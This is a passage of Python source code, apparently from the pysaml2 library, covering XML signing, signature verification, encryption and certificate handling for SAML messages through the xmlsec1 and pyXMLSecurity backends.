delete_tmpfiles=self.delete_tmpfiles)\n\n        com_list = [\n            self.xmlsec,\n            '--verify',\n            '--enabled-reference-uris', 'empty,same-doc',\n            '--pubkey-cert-{type}'.format(type=cert_type), cert_file,\n            '--id-attr:{id_attr_name}'.format(id_attr_name=id_attr),\n            node_name,\n        ]\n\n        if node_id:\n            com_list.extend(['--node-id', node_id])\n\n        try:\n            (_stdout, stderr, _output) = self._run_xmlsec(com_list, [tmp.name])\n        except XmlsecError as e:\n            six.raise_from(SignatureError(com_list), e)\n\n        return parse_xmlsec_output(stderr)\n\n    def _run_xmlsec(self, com_list, extra_args):\n        \"\"\"\n        Common code to invoke xmlsec and parse the output.\n        :param com_list: Key-value parameter list for xmlsec\n        :param extra_args: Positional parameters to be appended after all\n            key-value parameters\n        :result: Whatever xmlsec wrote to an --output temporary file\n        \"\"\"\n        with NamedTemporaryFile(suffix='.xml') as ntf:\n            com_list.extend(['--output', ntf.name])\n            com_list += extra_args\n\n            logger.debug('xmlsec command: %s', ' '.join(com_list))\n\n            pof = Popen(com_list, stderr=PIPE, stdout=PIPE)\n            p_out, p_err = pof.communicate()\n            p_out = p_out.decode()\n            p_err = p_err.decode()\n\n            if pof.returncode != 0:\n                errmsg = \"returncode={code}\\nerror={err}\\noutput={out}\".format(\n                    code=pof.returncode, err=p_err, out=p_out\n                )\n                logger.error(errmsg)\n                raise XmlsecError(errmsg)\n\n            ntf.seek(0)\n            return p_out, p_err, ntf.read()\n\n\nclass CryptoBackendXMLSecurity(CryptoBackend):\n    \"\"\"\n    CryptoBackend implementation using pyXMLSecurity to sign and verify\n    XML documents.\n\n    Encrypt and decrypt is currently unsupported by pyXMLSecurity.\n\n    pyXMLSecurity uses lxml (libxml2) to parse XML data, but otherwise\n    try to get by with native Python code. It does native Python RSA\n    signatures, or alternatively PyKCS11 to offload cryptographic work\n    to an external PKCS#11 module.\n    \"\"\"\n\n    def __init__(self):\n        CryptoBackend.__init__(self)\n\n    def version(self):\n        # XXX if XMLSecurity.__init__ included a __version__, that would be\n        # better than static 0.0 here.\n        return 'XMLSecurity 0.0'\n\n    def sign_statement(self, statement, node_name, key_file, node_id, id_attr):\n        \"\"\"\n        Sign an XML statement.\n\n        The parameters actually used in this CryptoBackend\n        implementation are :\n\n        :param statement: XML as string\n        :param node_name: Name of the node to sign\n        :param key_file: xmlsec key_spec string(), filename,\n            'pkcs11://' URI or PEM data\n        :returns: Signed XML as string\n        \"\"\"\n        import xmlsec\n        import lxml.etree\n\n        xml = xmlsec.parse_xml(statement)\n        signed = xmlsec.sign(xml, key_file)\n        signed_str = lxml.etree.tostring(signed, xml_declaration=False, encoding=\"UTF-8\")\n        if not isinstance(signed_str, six.string_types):\n            signed_str = signed_str.decode(\"utf-8\")\n        return signed_str\n\n    def validate_signature(self, signedtext, cert_file, cert_type, node_name, node_id, id_attr):\n        \"\"\"\n        Validate signature on XML document.\n\n        The parameters actually used in this CryptoBackend\n        implementation are :\n\n        :param signedtext: The signed XML data as string\n        :param cert_file: xmlsec key_spec string(), filename,\n            'pkcs11://' URI or PEM data\n        :param cert_type: string, must be 'pem' for now\n        :returns: True on successful validation, False otherwise\n        \"\"\"\n        if cert_type != 'pem':\n            raise Unsupported('Only PEM certs supported here')\n\n        import xmlsec\n        xml = xmlsec.parse_xml(signedtext)\n\n        try:\n            return xmlsec.verify(xml, cert_file)\n        except xmlsec.XMLSigException:\n            return False\n\n\ndef security_context(conf):\n    \"\"\" Creates a security context based on the configuration\n\n    :param conf: The configuration, this is a Config instance\n    :return: A SecurityContext instance\n    \"\"\"\n    if not conf:\n        return None\n\n    try:\n        metadata = conf.metadata\n    except AttributeError:\n        metadata = None\n\n    try:\n        id_attr = conf.id_attr_name\n    except AttributeError:\n        id_attr = None\n\n    sec_backend = None\n\n    if conf.crypto_backend == 'xmlsec1':\n        xmlsec_binary = conf.xmlsec_binary\n\n        if not xmlsec_binary:\n            try:\n                _path = conf.xmlsec_path\n            except AttributeError:\n                _path = []\n            xmlsec_binary = get_xmlsec_binary(_path)\n\n        # verify that xmlsec is where it's supposed to be\n        if not os.path.exists(xmlsec_binary):\n            # if not os.access(, os.F_OK):\n            err_msg = 'xmlsec binary not found: {binary}'\n            err_msg = err_msg.format(binary=xmlsec_binary)\n            raise SigverError(err_msg)\n\n        crypto = _get_xmlsec_cryptobackend(xmlsec_binary,\n                                           delete_tmpfiles=conf.delete_tmpfiles)\n\n        _file_name = conf.getattr('key_file', '')\n        if _file_name:\n            try:\n                rsa_key = import_rsa_key_from_file(_file_name)\n            except Exception as err:\n                logger.error('Cannot import key from {file}: {err_msg}'.format(\n                    file=_file_name, err_msg=err))\n                raise\n            else:\n                sec_backend = RSACrypto(rsa_key)\n    elif conf.crypto_backend == 'XMLSecurity':\n        # new and somewhat untested pyXMLSecurity crypto backend.\n        crypto = CryptoBackendXMLSecurity()\n    else:\n        err_msg = 'Unknown crypto_backend {backend}'\n        err_msg = err_msg.format(backend=conf.crypto_backend)\n        raise SigverError(err_msg)\n\n    enc_key_files = []\n    if conf.encryption_keypairs is not None:\n        for _encryption_keypair in conf.encryption_keypairs:\n            if 'key_file' in _encryption_keypair:\n                enc_key_files.append(_encryption_keypair['key_file'])\n\n    return SecurityContext(\n            crypto,\n            conf.key_file,\n            cert_file=conf.cert_file,\n            metadata=metadata,\n            only_use_keys_in_metadata=conf.only_use_keys_in_metadata,\n            cert_handler_extra_class=conf.cert_handler_extra_class,\n            generate_cert_info=conf.generate_cert_info,\n            tmp_cert_file=conf.tmp_cert_file,\n            tmp_key_file=conf.tmp_key_file,\n            validate_certificate=conf.validate_certificate,\n            enc_key_files=enc_key_files,\n            encryption_keypairs=conf.encryption_keypairs,\n            sec_backend=sec_backend,\n            id_attr=id_attr,\n            delete_tmpfiles=conf.delete_tmpfiles)\n\n\ndef encrypt_cert_from_item(item):\n    _encrypt_cert = None\n    try:\n        try:\n            _elem = extension_elements_to_elements(\n                item.extensions.extension_elements, [pefim, ds])\n        except:\n            _elem = extension_elements_to_elements(\n                item.extension_elements[0].children,\n                [pefim, ds])\n\n        for _tmp_elem in _elem:\n            if isinstance(_tmp_elem, SPCertEnc):\n                for _tmp_key_info in _tmp_elem.key_info:\n                    if _tmp_key_info.x509_data is not None and len(\n                            _tmp_key_info.x509_data) > 0:\n                        _encrypt_cert = _tmp_key_info.x509_data[\n                            0].x509_certificate.text\n                        break\n    except Exception as _exception:\n        pass\n\n    if _encrypt_cert is not None:\n        if _encrypt_cert.find('-----BEGIN CERTIFICATE-----\\n') == -1:\n            _encrypt_cert = '-----BEGIN CERTIFICATE-----\\n' + _encrypt_cert\n        if _encrypt_cert.find('\\n-----END CERTIFICATE-----') == -1:\n            _encrypt_cert = _encrypt_cert + '\\n-----END CERTIFICATE-----'\n    return _encrypt_cert\n\n\nclass CertHandlerExtra(object):\n    def __init__(self):\n        pass\n\n    def use_generate_cert_func(self):\n        raise Exception('use_generate_cert_func function must be implemented')\n\n    def generate_cert(self, generate_cert_info, root_cert_string,\n                      root_key_string):\n        raise Exception('generate_cert function must be implemented')\n        # Excepts to return (cert_string, key_string)\n\n    def use_validate_cert_func(self):\n        raise Exception('use_validate_cert_func function must be implemented')\n\n    def validate_cert(self, cert_str, root_cert_string, root_key_string):\n        raise Exception('validate_cert function must be implemented')\n        # Excepts to return True/False\n\n\nclass CertHandler(object):\n    def __init__(\n            self,\n            security_context,\n            cert_file=None, cert_type='pem',\n            key_file=None, key_type='pem',\n            generate_cert_info=None,\n            cert_handler_extra_class=None,\n            tmp_cert_file=None,\n            tmp_key_file=None,\n            verify_cert=False):\n        \"\"\"\n        Initiates the class for handling certificates. Enables the certificates\n        to either be a single certificate as base functionality or makes it\n        possible to generate a new certificate for each call to the function.\n\n        :param security_context:\n        :param cert_file:\n        :param cert_type:\n        :param key_file:\n        :param key_type:\n        :param generate_cert_info:\n        :param cert_handler_extra_class:\n        :param tmp_cert_file:\n        :param tmp_key_file:\n        :param verify_cert:\n        \"\"\"\n\n        self._verify_cert = False\n        self._generate_cert = False\n        # This cert do not have to be valid, it is just the last cert to be\n        # validated.\n        self._last_cert_verified = None\n        self._last_validated_cert = None\n        if cert_type == 'pem' and key_type == 'pem':\n            self._verify_cert = verify_cert is True\n            self._security_context = security_context\n            self._osw = OpenSSLWrapper()\n            if key_file and os.path.isfile(key_file):\n                self._key_str = self._osw.read_str_from_file(key_file, key_type)\n            else:\n                self._key_str = ''\n            if cert_file and os.path.isfile(cert_file):\n                self._cert_str = self._osw.read_str_from_file(cert_file,\n                                                              cert_type)\n            else:\n                self._cert_str = ''\n\n            self._tmp_cert_str = self._cert_str\n            self._tmp_key_str = self._key_str\n            self._tmp_cert_file = tmp_cert_file\n            self._tmp_key_file = tmp_key_file\n\n            self._cert_info = None\n            self._generate_cert_func_active = False\n            if generate_cert_info is not None \\\n                    and len(self._cert_str) > 0 \\\n                    and len(self._key_str) > 0 \\\n                    and tmp_key_file is not None \\\n                    and tmp_cert_file is not None:\n                self._generate_cert = True\n                self._cert_info = generate_cert_info\n                self._cert_handler_extra_class = cert_handler_extra_class\n\n    def verify_cert(self, cert_file):\n        if self._verify_cert:\n            if cert_file and os.path.isfile(cert_file):\n                cert_str = self._osw.read_str_from_file(cert_file, 'pem')\n            else:\n                return False\n            self._last_validated_cert = cert_str\n            if self._cert_handler_extra_class is not None and \\\n                    self._cert_handler_extra_class.use_validate_cert_func():\n                self._cert_handler_extra_class.validate_cert(\n                    cert_str, self._cert_str, self._key_str)\n            else:\n                valid, mess = self._osw.verify(self._cert_str, cert_str)\n                logger.info('CertHandler.verify_cert: %s', mess)\n                return valid\n        return True\n\n    def generate_cert(self):\n        return self._generate_cert\n\n    def update_cert(self, active=False, client_crt=None):\n        if (self._generate_cert and active) or client_crt is not None:\n            if client_crt is not None:\n                self._tmp_cert_str = client_crt\n                # No private key for signing\n                self._tmp_key_str = ''\n            elif self._cert_handler_extra_class is not None and \\\n                    self._cert_handler_extra_class.use_generate_cert_func():\n                (self._tmp_cert_str, self._tmp_key_str) = \\\n                    self._cert_handler_extra_class.generate_cert(\n                        self._cert_info, self._cert_str, self._key_str)\n            else:\n                self._tmp_cert_str, self._tmp_key_str = self._osw \\\n                    .create_certificate(self._cert_info, request=True)\n                self._tmp_cert_str = self._osw.create_cert_signed_certificate(\n                    self._cert_str, self._key_str, self._tmp_cert_str)\n                valid, mess = self._osw.verify(self._cert_str,\n                                               self._tmp_cert_str)\n            self._osw.write_str_to_file(self._tmp_cert_file, self._tmp_cert_str)\n            self._osw.write_str_to_file(self._tmp_key_file, self._tmp_key_str)\n            self._security_context.key_file = self._tmp_key_file\n            self._security_context.cert_file = self._tmp_cert_file\n            self._security_context.key_type = 'pem'\n            self._security_context.cert_type = 'pem'\n            self._security_context.my_cert = read_cert_from_file(\n                self._security_context.cert_file,\n                self._security_context.cert_type)\n\n\n# How to get a rsa pub key fingerprint from a certificate\n# openssl x509 -inform pem -noout -in server.crt -pubkey > publickey.pem\n# openssl rsa -inform pem -noout -in publickey.pem -pubin -modulus\nclass SecurityContext(object):\n    DEFAULT_ID_ATTR_NAME = 'ID'\n    my_cert = None\n\n    def __init__(\n            self,\n            crypto,\n            key_file='', key_type='pem',\n            cert_file='', cert_type='pem',\n            metadata=None,\n            template='',\n            encrypt_key_type='des-192',\n            only_use_keys_in_metadata=False,\n            cert_handler_extra_class=None,\n            generate_cert_info=None,\n            tmp_cert_file=None, tmp_key_file=None,\n            validate_certificate=None,\n            enc_key_files=None, enc_key_type='pem',\n            encryption_keypairs=None,\n            enc_cert_type='pem',\n            sec_backend=None,\n            id_attr='',\n            delete_tmpfiles=True):\n\n        self.id_attr = id_attr or SecurityContext.DEFAULT_ID_ATTR_NAME\n\n        self.crypto = crypto\n        assert (isinstance(self.crypto, CryptoBackend))\n\n        if sec_backend:\n            assert (isinstance(sec_backend, RSACrypto))\n        self.sec_backend = sec_backend\n\n        # Your private key for signing\n        self.key_file = key_file\n        self.key_type = key_type\n\n        # Your public key for signing\n        self.cert_file = cert_file\n        self.cert_type = cert_type\n\n        # Your private key for encryption\n        self.enc_key_files = enc_key_files\n        self.enc_key_type = enc_key_type\n\n        # Your public key for encryption\n        self.encryption_keypairs = encryption_keypairs\n        self.enc_cert_type = enc_cert_type\n\n        self.my_cert = read_cert_from_file(cert_file, cert_type)\n\n        self.cert_handler = CertHandler(\n                self,\n                cert_file, cert_type,\n                key_file, key_type,\n                generate_cert_info,\n                cert_handler_extra_class,\n                tmp_cert_file,\n                tmp_key_file,\n                validate_certificate)\n\n        self.cert_handler.update_cert(True)\n\n        self.metadata = metadata\n        self.only_use_keys_in_metadata = only_use_keys_in_metadata\n\n        if not template:\n            this_dir, this_filename = os.path.split(__file__)\n            self.template = os.path.join(this_dir, 'xml_template', 'template.xml')\n        else:\n            self.template = template\n\n        self.encrypt_key_type = encrypt_key_type\n        self.delete_tmpfiles = delete_tmpfiles\n\n    def correctly_signed(self, xml, must=False):\n        logger.debug('verify correct signature')\n        return self.correctly_signed_response(xml, must)\n\n    def encrypt(self, text, recv_key='', template='', key_type=''):\n        \"\"\"\n        xmlsec encrypt --pubkey-pem pub-userkey.pem\n            --session-key aes128-cbc --xml-data doc-plain.xml\n            --output doc-encrypted.xml session-key-template.xml\n\n        :param text: Text to encrypt\n        :param recv_key: A file containing the receivers public key\n        :param template: A file containing the XMLSEC template\n        :param key_type: The type of session key to use\n        :result: An encrypted XML text\n        \"\"\"\n        if not key_type:\n            key_type = self.encrypt_key_type\n        if not template:\n            template = self.template\n\n        return self.crypto.encrypt(text, recv_key, template, key_type)\n\n    def encrypt_assertion(self, statement, enc_key, template, key_type='des-192', node_xpath=None):\n        \"\"\"\n        Will encrypt an assertion\n\n        :param statement: A XML document that contains the assertion to encrypt\n        :param enc_key: File name of a file containing the encryption key\n        :param template: A template for the encryption part to be added.\n        :param key_type: The type of session key to use.\n        :return: The encrypted text\n        \"\"\"\n        return self.crypto.encrypt_assertion(\n                statement, enc_key, template, key_type, node_xpath)\n\n    def decrypt_keys(self, enctext, keys=None, id_attr=''):\n        \"\"\" Decrypting an encrypted text by the use of a private key.\n\n        :param enctext: The encrypted text as a string\n        :param keys: Keys to try to decrypt enctext with\n        :param id_attr: The attribute name for the identifier, normally one of\n            'id','Id' or 'ID'\n        :return: The decrypted text\n        \"\"\"\n        key_files = []\n\n        if not isinstance(keys, list):\n            keys = [keys]\n\n        keys_filtered = (key for key in keys if key)\n        keys_encoded = (\n            key.encode(\"ascii\") if not isinstance(key, six.binary_type) else key\n            for key in keys_filtered\n        )\n        key_files = list(\n            make_temp(key, decode=False, delete_tmpfiles=self.delete_tmpfiles)\n            for key in keys_encoded\n        )\n        key_file_names = list(tmp.name for tmp in key_files)\n\n        try:\n            dectext = self.decrypt(enctext, key_file=key_file_names, id_attr=id_attr)\n        except DecryptError as e:\n            raise\n        else:\n            return dectext\n\n    def decrypt(self, enctext, key_file=None, id_attr=''):\n        \"\"\" Decrypting an encrypted text by the use of a private key.\n\n        :param enctext: The encrypted text as a string\n        :return: The decrypted text\n        \"\"\"\n        if not id_attr:\n            id_attr = self.id_attr\n\n        if not isinstance(key_file, list):\n            key_file = [key_file]\n\n        key_files = [\n            key for key in itertools.chain(key_file, self.enc_key_files) if key\n        ]\n        for key_file in key_files:\n            try:\n                dectext = self.crypto.decrypt(enctext, key_file, id_attr)\n            except XmlsecError as e:\n                continue\n            else:\n                if dectext:\n                    return dectext\n\n        errmsg = \"No key was able to decrypt the ciphertext. Keys tried: {keys}\"\n        errmsg = errmsg.format(keys=key_files)\n        raise DecryptError(errmsg)\n\n    def verify_signature(self, signedtext, cert_file=None, cert_type='pem', node_name=NODE_NAME, node_id=None, id_attr=''):\n        \"\"\" Verifies the signature of a XML document.\n\n        :param signedtext: The XML document as a string\n        :param cert_file: The public key that was used to sign the document\n        :param cert_type: The file type of the certificate\n        :param node_name: The name of the class that is signed\n        :param node_id: The identifier of the node\n        :param id_attr: The attribute name for the identifier, normally one of\n            'id','Id' or 'ID'\n        :return: Boolean True if the signature was correct otherwise False.\n        \"\"\"\n        # This is only for testing purposes, otherwise when would you receive\n        # stuff that is signed with your key !?\n        if not cert_file:\n            cert_file = self.cert_file\n            cert_type = self.cert_type\n\n        if not id_attr:\n            id_attr = self.id_attr\n\n        return self.crypto.validate_signature(\n                signedtext,\n                cert_file=cert_file,\n                cert_type=cert_type,\n                node_name=node_name,\n                node_id=node_id,\n                id_attr=id_attr)\n\n    def _check_signature(self, decoded_xml, item, node_name=NODE_NAME, origdoc=None, id_attr='', must=False, only_valid_cert=False, issuer=None):\n        try:\n            _issuer = item.issuer.text.strip()\n        except AttributeError:\n            _issuer = None\n\n        if _issuer is None:\n            try:\n                _issuer = issuer.text.strip()\n            except AttributeError:\n                _issuer = None\n\n        # More trust in certs from metadata then certs in the XML document\n        if self.metadata:\n            try:\n                _certs = self.metadata.certs(_issuer, 'any', 'signing')\n            except KeyError:\n                _certs = []\n            certs = []\n\n            for cert in _certs:\n                if isinstance(cert, six.string_types):\n                    content = pem_format(cert)\n                    tmp = make_temp(content,\n                                    suffix=\".pem\",\n                                    decode=False,\n                                    delete_tmpfiles=self.delete_tmpfiles)\n                    certs.append(tmp)\n                else:\n                    certs.append(cert)\n        else:\n            certs = []\n\n        if not certs and not self.only_use_keys_in_metadata:\n            logger.debug('==== Certs from instance ====')\n            certs = [\n                make_temp(content=pem_format(cert),\n                          suffix=\".pem\",\n                          decode=False,\n                          delete_tmpfiles=self.delete_tmpfiles)\n                for cert in cert_from_instance(item)\n            ]\n        else:\n            logger.debug('==== Certs from metadata ==== %s: %s ====', _issuer, certs)\n\n        if not certs:\n            raise MissingKey(_issuer)\n\n        # saml-core section \"5.4 XML Signature Profile\" defines constrains on the\n        # xmldsig-core facilities. It explicitly dictates that enveloped signatures\n        # are the only signatures allowed. This mean that:\n        # * Assertion/RequestType/ResponseType elements must have an ID attribute\n        # * signatures must have a single Reference element\n        # * the Reference element must have a URI attribute\n        # * the URI attribute contains an anchor\n        # * the anchor points to the enclosing element's ID attribute\n        references = item.signature.signed_info.reference\n        signatures_must_have_a_single_reference_element = len(references) == 1\n        the_Reference_element_must_have_a_URI_attribute = (\n            signatures_must_have_a_single_reference_element\n            and hasattr(references[0], \"uri\")\n        )\n        the_URI_attribute_contains_an_anchor = (\n            the_Reference_element_must_have_a_URI_attribute\n            and references[0].uri.startswith(\"#\")\n            and len(references[0].uri) > 1\n        )\n        the_anchor_points_to_the_enclosing_element_ID_attribute = (\n            the_URI_attribute_contains_an_anchor\n            and references[0].uri == \"#{id}\".format(id=item.id)\n        )\n        validators = {\n            \"signatures must have a single reference element\": (\n                signatures_must_have_a_single_reference_element\n            ),\n            \"the Reference element must have a URI attribute\": (\n                the_Reference_element_must_have_a_URI_attribute\n            ),\n            \"the URI attribute contains an anchor\": (\n                the_URI_attribute_contains_an_anchor\n            ),\n            \"the anchor points to the enclosing element ID attribute\": (\n                the_anchor_points_to_the_enclosing_element_ID_attribute\n            ),\n        }\n        if not all(validators.values()):\n            error_context = {\n                \"message\": \"Signature failed to meet constraints on xmldsig\",\n                \"validators\": validators,\n                \"item ID\": item.id,\n                \"reference URI\": item.signature.signed_info.reference[0].uri,\n                \"issuer\": _issuer,\n                \"node name\": node_name,\n                \"xml document\": decoded_xml,\n            }\n            raise SignatureError(error_context)\n\n        verified = False\n        last_pem_file = None\n\n        for pem_fd in certs:\n            try:\n                last_pem_file = pem_fd.name\n                if self.verify_signature(\n                        decoded_xml,\n                        pem_fd.name,\n                        node_name=node_name,\n                        node_id=item.id,\n                        id_attr=id_attr):\n                    verified = True\n                    break\n            except XmlsecError as exc:\n                logger.error('check_sig: %s', exc)\n                pass\n            except Exception as exc:\n                logger.error('check_sig: %s', exc)\n                raise\n\n        if verified or only_valid_cert:\n            if not self.cert_handler.verify_cert(last_pem_file):\n                raise CertificateError('Invalid certificate!')\n        else:\n            raise SignatureError('Failed to verify signature')\n\n        return item\n\n    def check_signature(self, item, node_name=NODE_NAME, origdoc=None, id_attr='', must=False, issuer=None):\n        \"\"\"\n\n        :param item: Parsed entity\n        :param node_name: The name of the node/class/element that is signed\n        :param origdoc: The original XML string\n        :param id_attr: The attribute name for the identifier, normally one of\n            'id','Id' or 'ID'\n        :param must:\n        :return:\n        \"\"\"\n        return self._check_signature(\n                origdoc,\n                item,\n                node_name,\n                origdoc,\n                id_attr=id_attr,\n                must=must,\n                issuer=issuer)\n\n    def correctly_signed_message(self, decoded_xml, msgtype, must=False, origdoc=None, only_valid_cert=False):\n        \"\"\"Check if a request is correctly signed, if we have metadata for\n        the entity that sent the info use that, if not use the key that are in\n        the message if any.\n\n        :param decoded_xml: The SAML message as an XML infoset (a string)\n        :param msgtype: SAML protocol message type\n        :param must: Whether there must be a signature\n        :param origdoc:\n        :return:\n        \"\"\"\n\n        attr = '{type}_from_string'.format(type=msgtype)\n        _func = getattr(saml, attr, None)\n        _func = getattr(samlp, attr, _func)\n\n        msg = _func(decoded_xml)\n        if not msg:\n            raise TypeError('Not a {type}'.format(type=msgtype))\n\n        if not msg.signature:\n            if must:\n                err_msg = 'Required signature missing on {type}'\n                err_msg = err_msg.format(type=msgtype)\n                raise SignatureError(err_msg)\n            else:\n                return msg\n\n        return self._check_signature(\n                decoded_xml,\n                msg,\n                class_name(msg),\n                origdoc,\n                must=must,\n                only_valid_cert=only_valid_cert)\n\n    def correctly_signed_authn_request(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'authn_request', must, origdoc, only_valid_cert=only_valid_cert)\n\n    def correctly_signed_authn_query(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'authn_query', must, origdoc, only_valid_cert)\n\n    def correctly_signed_logout_request(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'logout_request', must, origdoc, only_valid_cert)\n\n    def correctly_signed_logout_response(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'logout_response', must, origdoc, only_valid_cert)\n\n    def correctly_signed_attribute_query(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'attribute_query', must, origdoc, only_valid_cert)\n\n    def correctly_signed_authz_decision_query(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'authz_decision_query', must, origdoc, only_valid_cert)\n\n    def correctly_signed_authz_decision_response(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'authz_decision_response', must, origdoc, only_valid_cert)\n\n    def correctly_signed_name_id_mapping_request(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'name_id_mapping_request', must, origdoc, only_valid_cert)\n\n    def correctly_signed_name_id_mapping_response(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'name_id_mapping_response', must, origdoc, only_valid_cert)\n\n    def correctly_signed_artifact_request(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'artifact_request', must, origdoc, only_valid_cert)\n\n    def correctly_signed_artifact_response(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'artifact_response', must, origdoc, only_valid_cert)\n\n    def correctly_signed_manage_name_id_request(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'manage_name_id_request', must, origdoc, only_valid_cert)\n\n    def correctly_signed_manage_name_id_response(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'manage_name_id_response', must, origdoc, only_valid_cert)\n\n    def correctly_signed_assertion_id_request(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'assertion_id_request', must, origdoc, only_valid_cert)\n\n    def correctly_signed_assertion_id_response(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, **kwargs):\n        return self.correctly_signed_message(decoded_xml, 'assertion', must, origdoc, only_valid_cert)\n\n    def correctly_signed_response(self, decoded_xml, must=False, origdoc=None, only_valid_cert=False, require_response_signature=False, **kwargs):\n        \"\"\" Check if a instance is correctly signed, if we have metadata for\n        the IdP that sent the info use that, if not use the key that are in\n        the message if any.\n\n        :param decoded_xml: The SAML message as a XML string\n        :param must: Whether there must be a signature\n        :param origdoc:\n        :param only_valid_cert:\n        :param require_response_signature:\n        :return: None if the signature can not be verified otherwise an instance\n        \"\"\"\n\n        response = samlp.any_response_from_string(decoded_xml)\n        if not response:\n            raise TypeError('Not a Response')\n\n        if response.signature:\n            if 'do_not_verify' in kwargs:\n                pass\n            else:\n                self._check_signature(decoded_xml, response,\n                                      class_name(response), origdoc)\n        elif require_response_signature:\n            raise SignatureError('Signature missing for response')\n\n        return response\n\n    def sign_statement_using_xmlsec(self, statement, **kwargs):\n        \"\"\" Deprecated function. See sign_statement(). \"\"\"\n        return self.sign_statement(statement, **kwargs)\n\n    def sign_statement(self, statement, node_name, key=None, key_file=None, node_id=None, id_attr=''):\n        \"\"\"Sign a SAML statement.\n\n        :param statement: The statement to be signed\n        :param node_name: string like 'urn:oasis:names:...:Assertion'\n        :param key: The key to be used for the signing, either this or\n        :param key_file: The file where the key can be found\n        :param node_id:\n        :param id_attr: The attribute name for the identifier, normally one of\n            'id','Id' or 'ID'\n        :return: The signed statement\n        \"\"\"\n        if not id_attr:\n            id_attr = self.id_attr\n\n        if not key_file and key:\n            content = str(key).encode()\n            tmp = make_temp(content, suffix=\".pem\", delete_tmpfiles=self.delete_tmpfiles)\n            key_file = tmp.name\n\n        if not key and not key_file:\n            key_file = self.key_file\n\n        return self.crypto.sign_statement(\n                statement,\n                node_name,\n                key_file,\n                node_id,\n                id_attr)\n\n    def sign_assertion_using_xmlsec(self, statement, **kwargs):\n        \"\"\" Deprecated function. See sign_assertion(). \"\"\"\n        return self.sign_statement(\n                statement, class_name(saml.Assertion()), **kwargs)\n\n    def sign_assertion(self, statement, **kwargs):\n        \"\"\"Sign a SAML assertion.\n\n        See sign_statement() for the kwargs.\n\n        :param statement: The statement to be signed\n        :return: The signed statement\n        \"\"\"\n        return self.sign_statement(\n                statement, class_name(saml.Assertion()), **kwargs)\n\n    def sign_attribute_query_using_xmlsec(self, statement, **kwargs):\n        \"\"\" Deprecated function. See sign_attribute_query(). \"\"\"\n        return self.sign_attribute_query(statement, **kwargs)\n\n    def sign_attribute_query(self, statement, **kwargs):\n        \"\"\"Sign a SAML attribute query.\n\n        See sign_statement() for the kwargs.\n\n        :param statement: The statement to be signed\n        :return: The signed statement\n        \"\"\"\n        return self.sign_statement(\n                statement, class_name(samlp.AttributeQuery()), **kwargs)\n\n    def multiple_signatures(self, statement, to_sign, key=None, key_file=None, sign_alg=None, digest_alg=None):\n        \"\"\"\n        Sign multiple parts of a statement\n\n        :param statement: The statement that should be sign, this is XML text\n        :param to_sign: A list of (items, id, id attribute name) tuples that\n            specifies what to sign\n        :param key: A key that should be used for doing the signing\n        :param key_file: A file that contains the key to be used\n        :return: A possibly multiple signed statement\n        \"\"\"\n        for (item, sid, id_attr) in to_sign:\n            if not sid:\n                if not item.id:\n                    sid = item.id = sid()\n                else:\n                    sid = item.id\n\n            if not item.signature:\n                item.signature = pre_signature_part(\n                        sid,\n                        self.cert_file,\n                        sign_alg=sign_alg,\n                        digest_alg=digest_alg)\n\n            statement = self.sign_statement(\n                    statement,\n                    class_name(item),\n                    key=key,\n                    key_file=key_file,\n                    node_id=sid,\n                    id_attr=id_attr)\n\n        return statement\n\n\ndef pre_signature_part(ident, public_key=None, identifier=None, digest_alg=None, sign_alg=None):\n    \"\"\"\n    If an assertion is to be signed the signature part has to be preset\n    with which algorithms to be used, this function returns such a\n    preset part.\n\n    :param ident: The identifier of the assertion, so you know which assertion\n        was signed\n    :param public_key: The base64 part of a PEM file\n    :param identifier:\n    :return: A preset signature part\n    \"\"\"\n\n    if not digest_alg:\n        digest_alg = ds.DefaultSignature().get_digest_alg()\n    if not sign_alg:\n        sign_alg = ds.DefaultSignature().get_sign_alg()\n    signature_method = ds.SignatureMethod(algorithm=sign_alg)\n    canonicalization_method = ds.CanonicalizationMethod(\n        algorithm=ds.ALG_EXC_C14N)\n    trans0 = ds.Transform(algorithm=ds.TRANSFORM_ENVELOPED)\n    trans1 = ds.Transform(algorithm=ds.ALG_EXC_C14N)\n    transforms = ds.Transforms(transform=[trans0, trans1])\n    digest_method = ds.DigestMethod(algorithm=digest_alg)\n\n    reference = ds.Reference(\n            uri='#{id}'.format(id=ident),\n            digest_value=ds.DigestValue(),\n            transforms=transforms,\n            digest_method=digest_method)\n\n    signed_info = ds.SignedInfo(\n            signature_method=signature_method,\n            canonicalization_method=canonicalization_method,\n            reference=reference)\n\n    signature = ds.Signature(\n            signed_info=signed_info,\n            signature_value=ds.SignatureValue())\n\n    if identifier:\n        signature.id = 'Signature{n}'.format(n=identifier)\n\n    if public_key:\n        x509_data = ds.X509Data(\n            x509_certificate=[ds.X509Certificate(text=public_key)])\n        key_info = ds.KeyInfo(x509_data=x509_data)\n        signature.key_info = key_info\n\n    return signature\n\n\n# <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n# <EncryptedData Id=\"ED\" 